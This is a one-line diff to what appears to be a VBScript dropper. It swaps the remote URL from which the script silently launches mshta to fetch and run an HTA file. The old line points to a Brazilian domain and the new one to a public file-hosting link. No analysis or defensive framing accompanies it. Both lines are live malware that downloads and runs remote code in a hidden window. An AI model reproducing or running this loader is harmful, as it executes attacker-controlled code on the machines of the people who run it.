@@ -1,1 +1,1 @@
-CreateObject("Wscript.Shell").Run  "C:\Windows\System32\mshta http://diamantesviagens.com.br/q.hta",0
+CreateObject("Wscript.Shell").Run  "C:\Windows\System32\mshta https://files.catbox.moe/nvrqw2.hta",0
